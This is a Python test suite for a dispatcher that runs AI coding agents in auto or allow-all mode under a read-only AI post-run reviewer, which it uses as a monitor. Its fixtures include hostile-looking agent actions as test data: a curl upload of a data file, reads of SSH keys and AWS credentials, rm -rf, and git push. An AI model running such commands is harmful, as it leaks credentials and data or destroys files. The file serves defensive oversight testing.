"""Cursor allow-all (--force), agy accept-edits, and the mandatory read-only Claude review after their auto
runs (approved by chalach on 2026-11-03). Stub CLIs only: the reviewer is the fake claude (main_review)."""
import json
import os
import sqlite3
import subprocess
import unittest

from helpers import Sandbox

from ckdispatch import postreview


def pairs(a):
    return [[str(a[i]), str(a[i + 1])] for i in range(len(a) - 1)]


class ReviewBase(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()
        self.scope = os.path.join(self.sb.devfab, "Projects", "Notes")

    def tearDown(self):
        self.sb.cleanup()

    def auto(self, agent, *extra, scope=True):
        args = ["--mode", "auto", "--no-live"] + (["--write-scope", "Projects/Notes"] if scope else []) + list(extra)
        return self.sb.run(agent, "devfab", *args)

    def events(self, p):
        rid = self.sb.run_id_from(p)
        return rid, [e for e in self.sb.ledger() if e["run_id"] == rid]

    def review_call(self):
        calls = [c for c in self.sb.calls() if c["agent"] == "claude" and c["prompt"].startswith("CK POST-RUN REVIEW")]
        return calls[-1] if calls else None


class TestAllowAllFlags(ReviewBase):
    def test_cursor_auto_gets_force_and_stays_in_its_task_folder(self):
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 0, p.stderr)
        call = [c for c in self.sb.calls() if c["agent"] == "cursor"][-1]
        a = call["argv"]
        self.assertIn("--force", a)
        self.assertIn("--trust", a)
        self.assertIn(["--sandbox", "enabled"], pairs(a))
        self.assertIn(["--workspace", os.path.realpath(self.scope)], pairs(a))
        self.assertNotIn("--auto-review", a)
        self.assertNotIn("--yolo", a)
        self.assertNotIn("-f", a)
        self.assertEqual(call["cwd"], os.path.realpath(self.scope))
        self.assertIn("allow-all (--force)", call["prompt"])
        self.assertIn("read-only Claude Code review checks this run", call["prompt"])

    def test_agy_auto_gets_auto_mode_and_the_workspace_and_run_folder(self):
        # chalach 2026-11-03: "agy still asks permission for the Device Fabrication folder ... pass agy --mode auto
        # plus --add-dir for the workspace root and the run folder (both headless and live)"
        p = self.auto("agy")
        self.assertEqual(p.returncode, 0, p.stderr)
        rd = os.path.join(self.sb.runs, self.sb.run_id_from(p))
        call = [c for c in self.sb.calls() if c["agent"] == "agy"][-1]
        a = call["argv"]
        self.assertIn(["--mode", "auto"], pairs(a))
        self.assertIn(["--add-dir", self.sb.devfab], pairs(a))
        self.assertIn(["--add-dir", rd], pairs(a))
        self.assertIn("--sandbox", a)
        self.assertEqual(call["cwd"], os.path.realpath(self.scope))  # cwd stays the task folder
        self.assertFalse(any("dangerously" in str(x) or "skip-permissions" in str(x) for x in a))
        self.assertNotIn("accept-edits", a)

    def test_agy_auto_without_scope_does_not_repeat_the_workspace(self):
        p = self.auto("agy", scope=False)
        self.assertEqual(p.returncode, 0, p.stderr)
        call = [c for c in self.sb.calls() if c["agent"] == "agy"][-1]
        self.assertEqual(call["cwd"], os.path.realpath(self.sb.devfab))
        dirs = [b for a_, b in pairs(call["argv"]) if a_ == "--add-dir"]
        self.assertEqual(dirs, [os.path.join(self.sb.runs, self.sb.run_id_from(p))])

    def test_agy_print_mode_auto_fallback_is_a_note_not_a_flag(self):
        warn = "warning: --mode auto is not available for this account; continuing in the default mode."
        self.sb.control(agy={"stderr": warn})
        p = self.auto("agy")
        self.assertEqual(p.returncode, 0, p.stderr)
        res = self.sb.result(self.sb.run_id_from(p))
        self.assertEqual(res["status"], "ok")
        self.assertFalse(res["rulecheck"]["flags"])
        self.assertTrue(any("--mode auto is not available" in n for n in res["rulecheck"]["notes"]))
        # the same warning in read mode, or plan mode ignored, still flags
        self.sb.control(agy={"stderr": "warning: --mode plan is not supported in print mode; continuing in the default mode."})
        p = self.auto("agy")
        self.assertEqual(p.returncode, 4, p.stderr)

    def test_live_argv_too(self):
        self.sb.window("run")
        for agent, flag in (("cursor", ["--force"]), ("agy", ["--mode", "auto"])):
            with self.subTest(agent=agent):
                p = self.sb.run(agent, "devfab", "--mode", "auto", "--write-scope", "Projects/Notes")
                self.assertEqual(p.returncode, 0, p.stderr)
                live_call = [c for c in self.sb.calls() if c["agent"] == agent and c["live"]][-1]
                self.assertTrue(any(live_call["argv"][i:i + len(flag)] == flag for i in range(len(live_call["argv"]))))
                if agent == "agy":
                    rd = os.path.join(self.sb.runs, self.sb.run_id_from(p))
                    self.assertIn(["--add-dir", self.sb.devfab], pairs(live_call["argv"]))
                    self.assertIn(["--add-dir", rd], pairs(live_call["argv"]))
                    self.assertEqual(live_call["argv"][-2], "-i")
                rid, evs = self.events(p)
                self.assertEqual([e["event"] for e in evs],
                                 ["dispatch", "live_window_opened", f"{agent}_review", "result"])
                self.assertEqual(evs[2]["status"], "ok")
                self.assertEqual(evs[3]["status"], "ok")

    def test_ck_cannot_ask_for_force(self):
        p = self.sb.ck("run", "--agent", "cursor", "--workspace", "devfab", "--title", "t",
                       "--prompt-file", self.sb.task(), "--force")
        self.assertEqual(p.returncode, 2)
        self.assertIn("forbidden flag --force", p.stderr)
        self.assertEqual(self.sb.calls(), [])

    def test_dry_run_names_the_review(self):
        p = self.sb.run("cursor", "devfab", "--mode", "auto", "--dry-run")
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn(" --force ", p.stdout)
        self.assertIn("MANDATORY read-only Claude review", p.stdout)
        self.assertIn("cursor_review", p.stdout)
        self.assertEqual(self.sb.calls(), [])


class TestReview(ReviewBase):
    def test_clean_cursor_run_gets_an_ok_review(self):
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 0, p.stderr)
        rid, evs = self.events(p)
        self.assertEqual([e["event"] for e in evs], ["dispatch", "cursor_review", "result"])
        rv = evs[1]
        self.assertEqual((rv["status"], rv["from"], rv["to"], rv["via"]), ("ok", "claude", "CK", "CK"))
        rd = os.path.join(self.sb.runs, rid)
        self.assertEqual(rv["response_path"], os.path.join(rd, "review.md"))
        self.assertIn("Status: OK", open(os.path.join(rd, "review.md")).read())
        self.assertIn("Hard facts ck-run found (0)", open(os.path.join(rd, "review-input.md")).read())
        call = self.review_call()
        a = call["argv"]
        self.assertIn(["--permission-mode", "plan"], pairs(a))  # read-only
        self.assertIn("-p", a)
        self.assertIn("--json-schema", a)
        self.assertIn(["--add-dir", rd], pairs(a))
        self.assertNotIn("--force", a)
        self.assertNotIn("acceptEdits", a)
        self.assertEqual(call["cwd"], os.path.realpath(self.scope))
        self.assertIn(os.path.join(rd, "review-input.md"), call["prompt"])
        self.assertNotIn("s3cr3t-value", json.dumps(call["env"]))
        deny = json.load(open(os.path.join(rd, "claude-settings-review.json")))["permissions"]["deny"]
        self.assertIn(f"Edit(/{self.sb.runs}/**)", deny)
        res = self.sb.result(rid)
        self.assertEqual(res["status"], "ok")
        self.assertEqual(res["post_review"]["status"], "ok")
        self.assertNotIn("FLAGGED", p.stdout)
        self.assertEqual(evs[2]["status"], "ok")

    def test_flagged_by_claude_is_loud_and_flags_the_run(self):
        self.sb.control(claude={"review": {"status": "flagged", "summary": "pushed to GitHub", "findings": [
            {"category": "git_push", "severity": "important", "detail": "the agent ran git push",
             "evidence": "Shell: git push origin main"}]}})
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 4, p.stderr)
        self.assertIn("CURSOR AUTO RUN FLAGGED BY THE POST-RUN CLAUDE REVIEW", p.stderr)
        self.assertIn("git push origin main", p.stderr)
        out = p.stdout.splitlines()
        self.assertTrue(out[1].startswith("FLAGGED by the post-run Claude review: [git_push]"), out)
        self.assertLessEqual(len(out), 11)
        rid, evs = self.events(p)
        rv = [e for e in evs if e["event"] == "cursor_review"][0]
        self.assertEqual(rv["status"], "flagged")
        self.assertIn("git_push", rv["note"])
        self.assertEqual(evs[-1]["status"], "flagged")
        md = open(os.path.join(self.sb.runs, rid, "review.md")).read()
        self.assertIn("Status: FLAGGED", md)
        self.assertIn("the agent ran git push", md)

    def test_review_that_does_not_finish_is_flagged(self):
        self.sb.control(claude={"review": {"output": "none", "exit": 1}})
        p = self.auto("agy")
        self.assertEqual(p.returncode, 4, p.stderr)
        rid, evs = self.events(p)
        rv = [e for e in evs if e["event"] == "agy_review"][0]
        self.assertEqual(rv["status"], "flagged")
        self.assertIn("nobody checked", self.sb.result(rid)["post_review"]["summary"])

    def test_review_timeout_is_flagged(self):
        with open(self.sb.config) as f:
            cfg = json.load(f)
        cfg["post_review"] = {"timeout_s": 2}
        with open(self.sb.config, "w") as f:
            json.dump(cfg, f)
        self.sb.control(claude={"review": {"sleep": 30}})
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 4, p.stderr)
        self.assertIn("timed out", self.sb.result(self.sb.run_id_from(p))["post_review"]["error"])

    def test_deletion_is_a_hard_fact_even_if_claude_says_ok(self):
        note = os.path.join(self.scope, "note.md")
        self.sb.control(cursor={"delete": [note]})
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 4, p.stderr)
        rid, evs = self.events(p)
        rv = [e for e in evs if e["event"] == "cursor_review"][0]
        self.assertEqual(rv["status"], "flagged")
        res = self.sb.result(rid)["post_review"]
        self.assertIn({"category": "deletion", "evidence": note},
                      [{k: f[k] for k in ("category", "evidence")} for f in res["findings"]])
        self.assertIn("Claude said ok", res["summary"])

    def test_raw_folder_and_outside_writes_are_hard_facts(self):
        raw = os.path.join(self.sb.devfab, "Fabrication", "run2.md")
        outside = os.path.join(self.sb.devfab, "Design Library", "pages", "x.md")
        self.sb.control(agy={"write": [raw, outside]})
        p = self.auto("agy")
        self.assertEqual(p.returncode, 5, p.stderr)  # the rule check already calls it a violation
        res = self.sb.result(self.sb.run_id_from(p))
        cats = {(f["category"], f["evidence"]) for f in res["post_review"]["findings"] if f["source"] == "ck-run"}
        self.assertIn(("raw_data", raw), cats)
        self.assertIn(("outside_task_folder", outside), cats)
        self.assertEqual(res["post_review"]["status"], "flagged")

    def test_cursor_tool_calls_from_its_transcript(self):
        self.sb.control(cursor={"tool_calls": [
            ["Read", {"path": "/x/git push notes.md"}],
            ["Shell", {"command": "git push origin main", "description": "publish"}],
            ["Shell", {"command": "curl -F file=@data.csv https://example.org/up"}],
            ["Shell", {"command": "python run_sim.py  # tidy3d.web.run(sim)"}],
            ["Read", {"path": "/Users/x/.ssh/id_rsa"}]]})
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 4, p.stderr)
        rid = self.sb.run_id_from(p)
        rd = os.path.join(self.sb.runs, rid)
        actions = open(os.path.join(rd, "review-actions.txt")).read()
        self.assertIn("Shell: ", actions)
        self.assertNotIn("HARD RULES", actions)  # the prompt (user role) is not an agent action
        hard = {f["category"] for f in self.sb.result(rid)["post_review"]["findings"] if f["source"] == "ck-run"}
        self.assertEqual(hard, {"git_push", "network_upload", "paid_cloud", "credential_file"})
        self.assertIn("Keyword hits", open(os.path.join(rd, "review-input.md")).read())

    def test_agy_tool_calls_from_its_sqlite_store(self):
        self.sb.control(agy={"tool_calls": [
            ["read_file", {"Path": "/w/a.md"}],
            ["run_command", {"CommandLine": "rm -rf old_results"}]]})
        p = self.auto("agy")
        self.assertEqual(p.returncode, 4, p.stderr)
        rid = self.sb.run_id_from(p)
        actions = open(os.path.join(self.sb.runs, rid, "review-actions.txt")).read()
        self.assertIn('read_file: {"Path": "/w/a.md"}', actions)
        self.assertIn("run_command: ", actions)
        hard = [f for f in self.sb.result(rid)["post_review"]["findings"] if f["source"] == "ck-run"]
        self.assertEqual([f["category"] for f in hard], ["deletion"])

    def test_git_repo_task_folder_shows_diff_and_deletions(self):
        repo = os.path.join(self.sb.local, "gitrepo")
        os.makedirs(repo)
        for name in ("keep.py", "gone.py"):
            with open(os.path.join(repo, name), "w") as f:
                f.write("x = 1\n")
        env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="tester", GIT_COMMITTER_NAME="t",
                   GIT_COMMITTER_EMAIL="tester", HOME=self.sb.home)
        for cmd in (["init", "-q"], ["add", "."], ["commit", "-qm", "init"]):
            subprocess.run(["git", *cmd], cwd=repo, env=env, check=True, capture_output=True)
        self.sb.control(cursor={"delete": [os.path.join(repo, "gone.py")], "write": [os.path.join(repo, "keep.py")]})
        p = self.sb.run("cursor", "devfab", "--mode", "auto", "--no-live", "--write-scope", repo)
        self.assertEqual(p.returncode, 4, p.stderr)
        rid = self.sb.run_id_from(p)
        text = open(os.path.join(self.sb.runs, rid, "review-input.md")).read()
        self.assertIn(f"repo {os.path.realpath(repo)}", text)
        self.assertIn(" D gone.py", text)
        self.assertIn("+stub edit", text)
        cats = [f["category"] for f in self.sb.result(rid)["post_review"]["findings"] if f["source"] == "ck-run"]
        self.assertIn("deletion", cats)

    def test_aqs_counts_as_raw_whatever_the_config_says(self):
        cfg_ws = type("W", (), {})()
        cfg_ws.root = cfg_ws.real_root = "/ws"
        cfg_ws.raw = []
        self.assertTrue(postreview._is_raw(cfg_ws, "/ws/AQS/report.md"))
        self.assertTrue(postreview._is_raw(cfg_ws, "/ws/data/raw/run1.csv"))
        self.assertFalse(postreview._is_raw(cfg_ws, "/ws/NV Project/AQS.md"))

    def test_text_only_mentions_become_notes_when_the_review_read_the_tool_log(self):
        # agy restates the rules in its answer ("No Tidy3D/Flexcompute jobs"): with a tool log and an ok review
        # that is a note; without a tool log it stays a flag.
        text = {"output": "text", "text": "Done. No cloud jobs: flexcompute and tidy3d.web were not used."}
        self.sb.control(agy=dict(text, tool_calls=[["read_file", {"Path": "/w/a.md"}]]))
        p = self.auto("agy")
        res = self.sb.result(self.sb.run_id_from(p))
        self.assertEqual(res["rulecheck"]["flags"], [], res["rulecheck"])
        self.assertTrue(any(n.startswith("checked by the post-run review (1 tool calls, ok): cloud_sim")
                            for n in res["rulecheck"]["notes"]))
        self.sb.control(cursor=text)  # no session store -> no tool log -> still a flag
        p = self.auto("cursor")
        res = self.sb.result(self.sb.run_id_from(p))
        self.assertTrue(any("cloud_sim mentioned in output text" in f for f in res["rulecheck"]["flags"]))
        self.assertEqual(p.returncode, 4)

    def test_review_prompt_says_the_agy_fallback_is_expected(self):
        p = self.auto("agy")
        self.assertIn("--mode auto is not available for this account", self.review_call()["prompt"])
        self.assertIn("Expected, do not flag by itself", self.review_call()["prompt"])

    def test_only_cursor_and_agy_auto_runs_are_reviewed(self):
        for agent, mode in (("claude", "auto"), ("codex", "auto"), ("cursor", "read"), ("agy", "read")):
            with self.subTest(agent=agent, mode=mode):
                extra = ["--write-scope", "Projects/Notes"] if mode == "auto" else []
                p = self.sb.run(agent, "devfab", "--mode", mode, "--no-live", *extra)
                self.assertEqual(p.returncode, 0, p.stderr)
                rid, evs = self.events(p)
                self.assertFalse([e for e in evs if e["event"].endswith("_review")])
                self.assertFalse(os.path.exists(os.path.join(self.sb.runs, rid, "review.md")))
        self.assertIsNone(self.review_call())

    def test_a_crashing_review_flags_the_run_instead_of_crashing_ck_run(self):
        from unittest import mock
        from ckdispatch import runner
        with mock.patch.object(runner.postreview, "collect", side_effect=RuntimeError("boom")):
            res = postreview.run(
                type("C", (), {"review_timeout_s": 5, "review_model": None, "bin_dirs": ["/nonexistent"]})(),
                agent="cursor", run_id="r", ws=type("W", (), {"root": self.sb.devfab})(), scopes=[],
                run_dir=self.sb.tmp, run_paths={"result_md": "x"}, snap={}, roots=[], changed=[], rc={},
                session_path=None, text="", write_settings=lambda p: None)
        self.assertEqual(res["status"], "flagged")
        self.assertIn("boom", res["error"])
        self.assertEqual(postreview.failed("agy", self.sb.tmp, ValueError("x"))["status"], "flagged")

    def test_thread_shows_the_review(self):
        p = self.auto("cursor")
        rid = self.sb.run_id_from(p)
        t = self.sb.ck("thread", rid).stdout
        self.assertIn("cursor review: **ok**", t)


class TestReviewUnits(unittest.TestCase):
    def test_keyword_hits_hard_only_in_commands_or_credentials(self):
        acts = [("Write", '{"path": "/w/notes.md", "contents": "never git push or rm -rf"}'),
                ("Shell", '{"command": "git push"}'),
                ("Read", '{"path": "/h/.aws/credentials"}')]
        hits = postreview.keyword_hits(acts, "I did not run git push.")
        hard = sorted((h["category"], h["tool"]) for h in hits if h["hard"])
        self.assertEqual(hard, [("credential_file", "Read"), ("git_push", "Shell")])
        self.assertTrue(any(h["source"] == "text" and not h["hard"] for h in hits))

    def test_agy_extractor_reads_real_shape(self):
        import tempfile
        d = tempfile.mkdtemp()
        path = os.path.join(d, "c.db")
        con = sqlite3.connect(path)
        con.execute("CREATE TABLE steps (idx integer, step_payload blob)")
        con.execute("INSERT INTO steps VALUES (0, ?)", (b"\x0a\x0bcall_21833\x12\x09read_file\x1ac{\"Path\":\"/a\"}\x10",))
        con.execute("INSERT INTO steps VALUES (1, ?)", (b"\x0a\x30HARD RULES: no git push\x10",))
        con.commit()
        con.close()
        self.assertEqual(postreview._agy_actions(path), [("read_file", '{"Path":"/a"}')])


if __name__ == "__main__":
    unittest.main()
